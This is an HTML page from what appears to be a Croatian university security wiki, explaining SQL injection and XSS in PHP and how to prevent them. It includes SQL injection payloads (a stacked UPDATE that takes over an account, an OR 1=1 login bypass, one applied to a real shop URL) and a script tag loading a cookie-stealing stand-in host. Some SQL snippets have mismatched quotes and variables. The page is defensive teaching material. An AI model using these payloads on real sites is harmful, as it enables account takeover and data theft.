@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Prevencija XSS-a i SQL injectiona u PHP-u - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Prevencija XSS-a i SQL injectiona u PHP-u</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#mw-head">orijentacija</a>,
+					<a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#SQL_injection"><span class="tocnumber">1</span> <span class="toctext">SQL injection</span></a>
+<ul>
+<li class="toclevel-2 tocsection-2"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Uvod_-_SQL"><span class="tocnumber">1.1</span> <span class="toctext">Uvod - SQL</span></a>
+<ul>
+<li class="toclevel-3 tocsection-3"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Elementi_jezika"><span class="tocnumber">1.1.1</span> <span class="toctext">Elementi jezika</span></a></li>
+<li class="toclevel-3 tocsection-4"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Operatori"><span class="tocnumber">1.1.2</span> <span class="toctext">Operatori</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-5"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#SQL_injection_2"><span class="tocnumber">1.2</span> <span class="toctext">SQL injection</span></a>
+<ul>
+<li class="toclevel-3 tocsection-6"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Primjer_1:"><span class="tocnumber">1.2.1</span> <span class="toctext">Primjer 1:</span></a></li>
+<li class="toclevel-3 tocsection-7"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Primjer_2:"><span class="tocnumber">1.2.2</span> <span class="toctext">Primjer 2:</span></a></li>
+<li class="toclevel-3 tocsection-8"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Primjer_3:"><span class="tocnumber">1.2.3</span> <span class="toctext">Primjer 3:</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-9"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Prevencija_SQL_injection_napada"><span class="tocnumber">1.3</span> <span class="toctext">Prevencija SQL injection napada</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-10"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#XSS"><span class="tocnumber">2</span> <span class="toctext">XSS</span></a>
+<ul>
+<li class="toclevel-2 tocsection-11"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#XSS_Uvod"><span class="tocnumber">2.1</span> <span class="toctext">XSS Uvod</span></a></li>
+<li class="toclevel-2 tocsection-12"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Princip_XSS_napada"><span class="tocnumber">2.2</span> <span class="toctext">Princip XSS napada</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Vrste_prijetnji_i_karakteristike"><span class="tocnumber">2.3</span> <span class="toctext">Vrste prijetnji i karakteristike</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Naj.C4.8De.C5.A1.C4.87e_prijetnje:"><span class="tocnumber">2.4</span> <span class="toctext">Najčešće prijetnje:</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Karakteristike:"><span class="tocnumber">2.5</span> <span class="toctext">Karakteristike:</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Tipovi_napada"><span class="tocnumber">2.6</span> <span class="toctext">Tipovi napada</span></a>
+<ul>
+<li class="toclevel-3 tocsection-17"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Non-Persistent"><span class="tocnumber">2.6.1</span> <span class="toctext">Non-Persistent</span></a></li>
+<li class="toclevel-3 tocsection-18"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Persistent"><span class="tocnumber">2.6.2</span> <span class="toctext">Persistent</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-19"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Prevencija"><span class="tocnumber">2.7</span> <span class="toctext">Prevencija</span></a></li>
+<li class="toclevel-2 tocsection-20"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Primjeri_napada"><span class="tocnumber">2.8</span> <span class="toctext">Primjeri napada</span></a>
+<ul>
+<li class="toclevel-3 tocsection-21"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#1."><span class="tocnumber">2.8.1</span> <span class="toctext">1.</span></a></li>
+<li class="toclevel-3 tocsection-22"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#2."><span class="tocnumber">2.8.2</span> <span class="toctext">2.</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-23"><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#Literatura"><span class="tocnumber">3</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h1> <span class="mw-headline" id="SQL_injection">SQL injection</span></h1>
+<h2> <span class="mw-headline" id="Uvod_-_SQL">Uvod - SQL</span></h2>
+<p>SQL (Structured Query Language) je poseban programski jezik dizajniran da bi se pomoću njega upravljalo sustavima za uparavljanje relacijskim bazama podataka (RDBMS). 
+SQL se sastoji od data description languagea (DDL) i data manipulation languagea (DML). 
+</p><p>DDL sintaksa je slična programskom jeziku za definiranje struktura podataka, dok je DML sintaksa slična programskom jeziku korištenom za umetanje, brisanje i ažuriranje podataka u bazama podataka. 
+</p>
+<h3> <span class="mw-headline" id="Elementi_jezika">Elementi jezika</span></h3>
+<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Image4.jpg" class="image"><img alt="Image4.jpg" src="../images/d/da/Image4.jpg" width="792" height="220" /></a>
+</p>
+<h3> <span class="mw-headline" id="Operatori">Operatori</span></h3>
+<table class="wikitable">
+
+<tr>
+<th> Operator
+</th>
+<th> Opis
+</th></tr>
+<tr>
+<td> =
+</td>
+<td> Jednako
+</td></tr>
+<tr>
+<td> &lt;&gt; ili&#160;!=
+</td>
+<td> Nije jednako
+</td></tr>
+<tr>
+<td> &gt;
+</td>
+<td> Veće od
+</td></tr>
+<tr>
+<td> &lt;
+</td>
+<td> Manje od
+</td></tr>
+<tr>
+<td> &gt;=
+</td>
+<td> Veće ili jednako
+</td></tr>
+<tr>
+<td> &lt;=
+</td>
+<td> Manje ili jednako
+</td></tr>
+<tr>
+<td> BETWEEN
+</td>
+<td> Između određenog raspona
+</td></tr>
+<tr>
+<td> LIKE
+</td>
+<td> Pretraga po uzorku
+</td></tr>
+<tr>
+<td> IN
+</td>
+<td> Specificiranje više mogućih vrijednosti za stupac
+</td></tr>
+</table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="SQL_injection_2">SQL injection</span></h2>
+<p>SQL injection napad je točno to što mu i ime kaže. Injection, ili umetanje je ono što napadač pokušava napraviti da bi ubacio svoj maliciozni SQL kôd u neku bazu podataka i prisilio ju da izvrši zadanu naredbu. Rezultat toga može biti gubitak podataka u bazi, izvlačenje podataka iz baze (uključujući privatne informacije iz tablica), ali i uništavanje, tj. brisanje kompletne baze podataka. 
+Ideja koja stoji iza SQL injectiona je zapravo natjerati aplikaciju koja radi da pokrene umetnuti dio kôda. 
+</p>
+<h3> <span class="mw-headline" id="Primjer_1:">Primjer 1:</span></h3>
+<p>Svaki SQL injection napad obično započinje tako da napadač  ubacuje svoj kôd u nekakav tip forme na web stranici. Primjer takve forme (obrasca) je forma za logiranje na Facebook.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Image2.jpg" class="image"><img alt="Image2.jpg" src="../images/1/15/Image2.jpg" width="1027" height="271" /></a>
+</p><p><br />
+Za ovaj prvi primjer, koristit ćemo neku hipotetsku formu s kojom se većina ljudi vjerojatno susrela. 
+To je forma za vraćanje izgubljene lozinke putem emaila, koju većina web stranica koristi u slučaju da korisnici zaborave lozinku svojih korisničkih računa. 
+</p><p>Način na koji uobičajena "send me my password by email" forma radi je ovaj:
+</p><p>1. uzme email adresu kao input od korisnika
+</p><p>2. aplikacija pretražuje bazu podataka da bi našla unesenu email adresu
+</p><p>3. u slučaju da ne pronađe unesenu adresu, jednostavno ne pošalje email sa starom/novom lozinkom 
+</p><p>4. u slučaju da pronađe unesenu adresu u bazi podataka, aplikacija će poslati mail sa starom i/ili novom lozinkom i/ili linkom za resetiranje lozinke
+</p><p><br />
+Tu se pojavljuje SQL injection. 
+</p><p>Jer što ako napadaču uopće nije cilj dati valjanu email adresu, nego jednostavno želi ubaciti dio kôda koji će se pokrenuti u bazi podataka i na pladnju mu dati povjerljive informacije iz iste. 
+</p><p><br />
+<b>Početak SQL injection procesa</b>
+</p><p>Za početak pretpostavimo da aplikacija koristi PHP skriptni jezik uz SQL bazu podataka. 
+Tada bi forma za vraćanje lozinke mogla izgledala slično ovome 
+</p><p><br />
+</p>
+<pre>SELECT data 
+         FROM table
+             WHERE Emailunos = '$ulazim_vam@bazu.com
+</pre>
+<p><br />
+Napadač naravno ne vidi ovaj dio kôda, a varijabla '$email_unos' sadrži bilo koji unos kojeg korisnik unese u polje forme.  
+</p><p><br />
+<b>1. korak</b> 
+</p><p>Da bi napadač bio u prednosti i koristio našu slabu aplikaciju u svoju korist, prvo mora razjasniti kako se aplikacija nosi s krivim unosima. 
+Za početak, unos bilo koje email adrese s navodnikom na kraju, npr.: 
+</p><p><b>ulazim_vam@bazu.com'</b>
+</p><p><br />
+Nakon ovakvog unosa, postoje dva scenarija: 
+</p><p>1. Aplikacija će maknuti navodnik jer će pretpostaviti da je email adresa s navodnikom mogući maliciozni kôd. Iako, po IETF standardima – navodnici mogu biti email adrese. Zanemarujući to, aplikacija miče sve znakove koje smatra nepotrebnima – u našem slučaju miče samo navodnike na kraju "valjane" email adrese.  Nakon uklanjanja "viška", aplikacija će potražiti ostatak adrese ( ulazim_vam@bazu.com ) u bazi podataka.
+</p><p><br />
+2. Aplikacija neće maknuti navodnik i automatski će ga pokrenuti kao dio SQL-a. Ovo je scenarij koji odgovara napadaču, pa ćemo ovaj korak uzeti kao realan. 
+</p><p>Pogledajmo kako bi u tom slučaju izgledala naša forma za vraćanje lozinke: 
+</p>
+<pre>SELECT data 
+         FROM table
+             WHERE Emailunos = '$ulazim_vam@bazu.com<i>;</i>
+</pre>
+<p>Nakon izvršavanja navedenog kôda od strane aplikacije, SQL bi uočio duple navodnike na kraju zadnje linije i prekinuo bi izvršavanje uz "syntax error". 
+</p><p><b>Odgovor koji napadač čeka</b>
+</p><p>Puno toga ovisi o sustavu na kojemu je pokrenuta aplikacija, ali i o postavkama same aplikacije, pa se tako i odgovor kojeg će napadač dobiti nakon unosa može razlikovati. Ali velika je vjerojatnost da napadač neće dobiti grešku koja govori nešto kao "email adresa ne postoji, unesite valjanu adresu ili se registrirajte", jer bi se to pojavilo u slučaju da aplikacija koristi 1. scenarij i izdvaja navodnik. Ali kako smo mi uzeli 2. scenarij kao realan, vrlo je vjerojatno da ćemo vidjeti grešku tipa "Internal error" ili "Database error" – i pomoću toga je i napadač siguran da naša aplikacija ne uklanja dodatni navodnik, što mu daje znak da je na pravom putu. 
+</p><p><br />
+<b>2. korak: vrijeme je za SQL injection</b> 
+</p><p>Kako je napadač dobio potvrdu o ranjivosti baze podataka, vrijeme je da tu ranjivost i iskoristi. 
+Sve što je još potrebno napadaču je da razumije format tablice i jednostavno upisom zloćudnog kôda u polje forme gdje se inače upisuje email adresa, neovlašteno ulazi u bazu. 
+Primjer takvog kôda: 
+</p>
+<pre>    Y';
+    UPDATE table
+       SET email = 'ulazim_vam@bazu.com'
+          WHERE email = 'darko@MUPpet.hr';
+</pre>
+<p>Primjetimo da je napisani SQL valjan po svim SQL pravilima. Nakon Y, nalazi se dodatni navodnik nakon kojeg je točka sa zarezom, što omogućava napadaču da završi jednu naredbu i krene u izvršavanje druge. 
+Ako je napad prošao uspješno, aplikacija će izvršiti ovaj kôd: 
+</p>
+<pre>SELECT data 
+    FROM table
+       WHERE Emailunos = 'Y';
+         UPDATE table
+           SET email = 'ulazim_vam@bazu.com'
+           WHERE email = 'darko@MUPpet.hr';
+</pre>
+<p>Ovime smo resetirali mail adresu korisnika Darka i zamijenili ju svojom. Tako smo dobili direktan pristup njegovom računu preko našeg emaila, jer će na naš email stići njegova lozinka koju možemo promijeniti i u potpunosti preuzeti račun. 
+</p>
+<h3> <span class="mw-headline" id="Primjer_2:">Primjer 2:</span></h3>
+<p><b>McAfee – Hacme Casino</b>
+</p><p>Hacme Casino je online casino platforma namijenjena za testiranje sigurnosti. <a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" class="external autonumber" rel="nofollow">[1]</a> McAfee Hacme Casino download
+</p><p>Svatko može isprobati kako SQL injection radi besplatnim preuzimanjem ove aplikacije, uz napomenu da je poprilično zastarjela i da ima puno boljih novijih aplikacija, ali i kompliciranijih. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Hacme-home.png" class="image"><img alt="Hacme-home.png" src="../images/7/72/Hacme-home.png" width="1005" height="746" /></a>
+</p><p>Kao što možemo vidjeti iz gore prikazanog screenshota, s lijeve strane postoji login forma, što nam je idealan početak za ovakav tip napada jer većina web aplikacija provjerava autentikaciju kroz SQL bazu. 
+</p><p>Da bi se uspješno izvršio napad, moramo "uvjeriti" bazu da je ono što mi unesemo istina. Npr. unosom John_Doe u Login polje i winbig u Password polje možemo se pokušati prijaviti. Nakon što kliknemo na Login gumb, sustav provjerava podatke koje smo upisali u bazi podataka koristeći upit SELECT * FROM users WHERE (username=’’ AND password=’’). Možemo zamisliti da su podaci ispravni i da ćemo se prijaviti kao John_Doe korisnik, ali kod nas to nije slučaj, pa pogledajmo što se dogodilo: 
+</p><p><br />
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Hacme-login.png" class="image"><img alt="Hacme-login.png" src="../images/a/ad/Hacme-login.png" width="187" height="297" /></a>
+</p><p><br />
+Rezultat je neuspješnja prijava, jer korisničko ime i/ili lozinka nisu bili istiniti. Možemo pomoću brute force alata pokušati ući u korisnički račun, ali čak i automatizmom bi to trajalo predugo, ako bi uopće dalo dobar rezultat. Uzmimo primjer da napišemo nešto što je istina, npr. 1=1. To je istinita izjava, ali nam fali SQL string da bi stvar radila. Zato koristimo ') OR 1=1-- umjesto toga. Nakon unosa te vrijednosti u Login polje, Password polje ostavimo prazno i pojavljuje nam se ovo: 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Hacme-profile.png" class="image"><img alt="Hacme-profile.png" src="../images/e/e3/Hacme-profile.png" width="998" height="591" /></a>
+</p><p>Sad smo uspješno prijavljeni kao Andy Aces. Zašto kao Andy Aces? 
+Zato jer je baš korisnik s tim imenom imao nesreću i bio prvi unos u tablici korisnika, pa je naš upit SELECT * FROM users WHERE (username=’’) OR 1=1—AND password=’’) vratio njegov korisnički profil. 
+</p><p>Drugi način na koji se ovo može izvesti je taj da pogledamo URL kad se uspješno logiramo na site. Npr., napadač može napraviti pravi račun na nekoj shoping stranici. Nakon uspješne prijave na svoj račun, može vidjeti URL adresu u kojoj piše <a href="http://www.links.hr/accountView?id=G33O5652gf0" class="external free" rel="nofollow">http://www.links.hr/accountView?id=G33O5652gf0</a> 
+Promjenom id-a u string korišten ranije ') OR 1=1—možemo natjerati server da prikaže stranicu sa podacima svih računa, ne samo onima od napadača. 
+</p><p><br />
+Oba primjera, 1 i 2 su prikazana u najjednostavnijem obliku. Većina napada koji se izvršavaju na web stranice i/ili baze podataka koriste sofisticiranije i složenije metode, ali to ne znači nešto jednostavno, kao što je a=a neće upaliti. 
+</p><p>Zbog svega toga i lakoće kojom je moguće ući u bazu podataka, potrebno je obratiti pozornost na sigurnost, prevenciju i obranu.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Primjer_3:">Primjer 3:</span></h3>
+<p><b>sqlmap – Automatic SQL injection and database takeover tool</b> <a href="http://sqlmap.org/" class="external autonumber" rel="nofollow">[2]</a> sqlmap - službeni site
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sqlmap.jpg" class="image"><img alt="Sqlmap.jpg" src="../images/4/46/Sqlmap.jpg" width="955" height="197" /></a>
+</p><p>sqlmap je open source alat za testiranje sigurnosti koji automatizira proces otkrivanja i iskorištavanja SQL injection mana i preuzimanje poslužitelja baza podataka. Dolazi u paketu sa raznim alatima i mogućnostima, od database fingerprinta, do pristupa podatkovnom sistemu i izvršavanju naredbi na udaljenim operativnim sustavima. 
+Prvi primjer SQL injectiona bio je vrlo pojednostavljen zbog lakšeg shvaćanja principa i samog cilja takvog napada. Alati poput sqlmap-a su relativno automatizirani i nude puno više mogućnosti napadaču i iskorištavaju doslovno svaku slabu točku sustava. 
+</p><p><br />
+sqlmap nećemo posebno opisivati u detalje jer je njegovo korištenje presloženo i ima previše opcija za projekt ovakvog tipa. Dovoljno je reći da je to poprilično moćan alat za sve koje zanima web sigurnost. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Sqlmap_screenshot.png" class="image"><img alt="Sqlmap screenshot.png" src="../images/2/21/Sqlmap_screenshot.png" width="673" height="546" /></a>
+</p><p><br />
+Još treba napomenuti da je sqlmap 50% domaći proizvod, naime jedan od dva developera sqlmap-a je FER-ovac Miroslav Stampar. 
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Prevencija_SQL_injection_napada">Prevencija SQL injection napada</span></h2>
+<p>Nekoliko je metoda da bi se spriječio SQL injection napad. 
+</p><p>•	za početak je potrebno parsirati (ovo smo vidjeli u primjeru broj 1) i provjeriti unos od strane korisnika
+</p><p>•	nakon toga kreirati generičku stranu za greške u aplikaciji
+</p><p>•	aplikativnom korisniku dati najmanji skup prava i privilegija
+</p><p>•	koristiti Database Firewalla (vatrozid) da bi se pratile aktivnosti baze i po potrebi blokirale SQL naredbe
+</p><p>•	na kraju testirati aplikaciju na SQL injection napade pomoću široko dostupnih aplikacija (poput sqlmap-a) 
+</p><p><br />
+</p><p>Po <b>OWASP</b>-u postoje dvije "linije obrane" od SQL injection napada. 
+Primarna, koja uključuje 3 koraka i dodatna koja ima 2 koraka. 
+</p><p><br />
+Primarna: 
+</p><p>1: Korištenje pripremljenih upita
+</p><p>2: Korištenje spremljenih procedura
+</p><p>3: Izbjegavanje svih korisničkih unosa
+</p><p><br />
+</p><p>Dodatna:
+</p><p>1: Pojačavanje (postrožavanje) minimalnih privilegija
+</p><p>2: Ubaciti tzv. "bijelu listu" provjere unosa
+</p><p>Također, česta zabluda je da se korisnički unosi mogu filtrirati. 
+Najjednostavniji i najefektivniji način za spriječiti SQL injection napad je korištenjem pripremljenih upita. A da bi se izbjegli problemi, potrebno je koristiti i escape stringove u slučaju da radimo s vanjskim kôdom. 
+</p><p>Npr. ako ubacimo string u SQL kojemu je cilj MySQL, moramo izaći iz tog stringa s MySQL funkcijom mysql_real_escape_string. 
+Drugi primjer je HTLM. Ako ubacimo string u HTLM markup, moramo izaći sa htmlspecialchars. Što bi značilo da svaki echo ili print mora koristiti htmlspecialchars. 
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Boris_%C5%A0alamon&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Boris Šalamon (stranica ne postoji)">Boris Šalamon</a> 14:52, 12. lipnja 2013. (CEST)
+</p>
+<hr />
+<p><br />
+</p>
+<h1> <span class="mw-headline" id="XSS">XSS</span></h1>
+<h2> <span class="mw-headline" id="XSS_Uvod">XSS Uvod</span></h2>
+<p>Cross Site Scripting ili skraćeno, xss jedan je od najčešćih oblika napada na web aplikacije.
+XSS je proces izvršavanja i prikaza neovlaštenog koda na korisničkoj strani u  pregledniku i sadržaja na stranici prije prethodne validacije. Rizik od napada zavisi o bitnosti(vrijednosti) podataka koji se nalaze na samom web mjestu(tj. serveru; BP). Predmet ili put napada su najčešće client-side jezici kao HTML a pogotovo JavaScript. Alati kojima se sprečava ova vrsta napada su najčeše dio web-based programskih jezika(PHP, Asp.net, C#,  Ruby..) a baziraju se na validaciji ispravnosti unešenih podataka prije samog izvršavanja(zapisa u BP, prikazivanja).
+Razlozi napada mogu biti različiti ali generalno to su krađa korisničkih informacija i identiteta te neovlaštena objava sadržaja u vlastiu korist.
+</p>
+<h2> <span class="mw-headline" id="Princip_XSS_napada">Princip XSS napada</span></h2>
+<p>Sam xss napad se izvšava na način da koristi funkcionalnost internet preglednika i načina na koji prenosi podatke. Maliciozni kod XSS napada ser prenosi skupa sa ostalim formatiranim podacima na način da se ugnježđuje(eng. nesting) u URL, Formu za unos podataka, Cookie, HTTP Header ili se prenosi web feedom(syndicate).
+Najveći problem brzog širenja tj. sprečavanja ovog oblika napada je razvoj web-a (web 2.0) prema korištenju skriptihjezika koji se izvršavaju na korisničkom računalu tj. u samome pregledniku.
+</p><p>Tako različiti jezici(koji koriste parsere;formuliraju kod/sadržaj sa tagovima) od xml-a, html-a, css-a,  JS-a koji su dio DOM-a (cross-platform konvencija) olakšavaju prijenos istog malicioznog koda preko različitih mreža i platformi. Bitnu ulogu ima i AJAX (JavaScript i XML) jer su pružili mogućnost izvršavanja koda na klijentskoj strani.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss.jpg" class="image"><img alt="Xss.jpg" src="../images/e/e0/Xss.jpg" width="842" height="553" /></a>
+</p>
+<h2> <span class="mw-headline" id="Vrste_prijetnji_i_karakteristike">Vrste prijetnji i karakteristike</span></h2>
+<h2> <span class="mw-headline" id="Naj.C4.8De.C5.A1.C4.87e_prijetnje:">Najčešće prijetnje:</span></h2>
+<p>•	Moralne prijetnje i radnje protiv web-sitea - neovlaštena objava i narušavanje ugleda
+</p><p>•	Krađa sesije i passworda – Napadač uzima ID iz cookie-a što pruža napadaču da se serveru predstavi kao ovlašteni korisnik te daje sva prava koja pravi korisnik ima(broj kreditne kartice) 
+</p><p>•	Neovlašteno praćenje korisnika – isto kao prethodno uz praćenje koristnikovih aktivnosti
+</p><p>•	Kontrola prikaza i prikaz lažnog sadržaja korisniku – promjena sadržaja ili prikaz potpuno druge stranice
+</p><p>•	Slanje podataka(remote) drugim serverima na mreži
+</p><p>•	Zahtjev(fetch) skripti  od bilo kuda – napredniji i kompleksniji napadi koji pružaju napadaču da na server prenese svoje skripte sa drugih mjesta
+</p><p>•	Širenje(embed) malicioznog koda – implementiranje malicioznog koda u inače zdrave skripte te automatsko širenje samim pristupom(ne zahtjeva od korisnika nikakve neuobičajene radnje)
+</p>
+<h2> <span class="mw-headline" id="Karakteristike:"> Karakteristike: </span></h2>
+<p>Za razliku od također popularnog SQL-injectiona SSX se širi korisnicima vrlo brzo i izaziva napade velikih razmjera. Ukoliko se radi o „persistent“ tipu napada kada jemaliciozni kod zapisan u bazi, isti je potencijalan da se širi velikom broju korisnika tj. svakom ko se koristi tim web mjestom.
+</p>
+<h2> <span class="mw-headline" id="Tipovi_napada">Tipovi napada</span></h2>
+<p>Postoji zapravo puno različitih vrsta i tipova xss napada ali se svi baziraju na istom slijedu događaja. Najčešće žrtve su stranice sa vijestima koje imaju polja za komentare koje služe žrtvi za injektiranje napada. Također su žrtve stranice koje imaju login sustav. Kod njih je napadačev cilj saznati korisničke podatke.
+</p><p>Pošto se sustav bazira na sesiji i cookie-ju, cilj je doći do ID-a korisnika kako bi se isti upisao u napadačev u njegovom browseru te se on predstavio kao vjerodostojni korisnik.  Tada može raditi zapravo sve što i prijavljeni korisnik.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Non-Persistent">Non-Persistent</span></h3>
+<p>Najčešći je oblik xss napada. Koristi funkcionalnost HTML upita ili formi za unos podataka za direktno generiranje stranice rezultata bez analiziranja(„sanitiziranja“) zahtjeva. 
+</p><p>Mamac napada je najčešće poveznica(link) na dosljedni(trusted) web-site koja zapravo posjeduje xss „vektor“ koji preusmjerava vezu na skriptu koja je zaražena. Ta skripta se izvršava u korisnikovom pregledniku u milisekundama te nakon izvršavanja vraća korisnika na stranicu kojoj vjeruje tj., korisnik niti ne vidi da se napad izvršio
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Persistent">Persistent</span></h3>
+<p>Persistent ili konstantna vrsta napada je složenija i opasnija od „non-persistent“ jer su ugroženi svi korisnici koji pristupaju stranici koja je zaražena. U ovom slučaju napadačeva maliciozna skripta se nalazi na serveru tj. u bazi podatala. 
+</p><p>Najčešći i najlakši ulaz u bazu napadač ima također kroz forme za unos koje pohranjuju određeni tekst u bazu. To su komentari na vijesti, komentari i ocjene proizvoda i sl.
+</p>
+<h2> <span class="mw-headline" id="Prevencija">Prevencija</span></h2>
+<p>Prevencija xss-a se bazira na provjeri SVIH podataka koji prilaze serveru ili se trebaju zapisati u BP.
+</p><p><br />
+1.	Dakle, podaci se prije zapisa trebaju kao varijable „provući“ kroz funkcije te je potrebno maknuti sav „nepotrebni“sadržaj koji omogućuje izvršavanje nekog programskog koda. 
+</p><p>2.	Drugi korak je i smanjivanje samog vremena sesije(sjednice) tj. vremena koje je potrebno da se korisniku uskrati pristup serveru od zadnje aktivnosti. 
+</p><p>3.	Što se tiče korisničke strane uz uzdanje u sigurnosne mjere samog preglednika može se isključiti klijentska strana izvršavanja koda(JS) u pregledniku ili korištenje samo stranica koje podržavaju server-side izvršavanje.
+</p><p><br />
+PHP - izdvajanje varijabli prije upisa u bazu te "čišćenje" podataka.
+</p><p>Najčešće i vrlo jednostavne funkcije u PHP-u za sprečavanje unosa neželjenog koda u BP:
+</p><p><br />
+1. htmlspecialchars($x); - svi posebni znakovi se pretvaraju u html kodove dok se sadržaj i dalje prikazuje (html special chars: <a href="http://www.degraeve.com/reference/specialcharacters.php" class="external free" rel="nofollow">http://www.degraeve.com/reference/specialcharacters.php</a>)  
+</p><p><br />
+sadržaj: 
+</p><p><br />
+</p><p>&lt;script src="<a href="http://KrademKuKi.php" class="external free" rel="nofollow">http://KrademKuKi.php</a>"&gt;&lt;/script&gt;
+</p><p><br />
+će nakon prolaska kroz navedenu funkciju izgledati ovako:
+</p><p>&lt;script src=&quot;<a href="http://KrademKuKi.php&amp;quot" class="external free" rel="nofollow">http://KrademKuKi.php&amp;quot</a>;&gt;&lt;/script&gt;
+</p><p><br />
+Ovaj kod korisniku neće biti "ugodan" ali mu neće niti pokrenuti kobnu skriptu koja bi mu broj kreditne kartice stavila "na raspolaganje" napadaču.&#160;:-)
+</p><p>Još bolja funkcija je htmlentities jer sadrži veću baz kodova specijaliziranih znakova. Naravno sve ovisi o verzijama programskih jezika koji se koriste(HTML 4/5, PHP 4/5)
+</p>
+<h2> <span class="mw-headline" id="Primjeri_napada">Primjeri napada</span></h2>
+<p>Za samo testiranje napada koriste se open-source programi koji su namjerno ranjivi kako bi se mogao ispitati određeni napad ili valjanost koda obrane. Ispod su navedena dva popularna i praktična za korištenje.
+</p><p>Potrebno ih je download-ati te extract-ati kao foldere u htdocs direktorij xampp(ili wamp/lamp koji već koristite) servera na Vašem računalu.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dvwa.JPG" class="image"><img alt="Dvwa.JPG" src="../images/6/6b/Dvwa.JPG" width="441" height="591" /></a>
+</p><p><a href="http://www.dvwa.co.uk/" class="external autonumber" rel="nofollow">[3]</a> - DVWA Download link
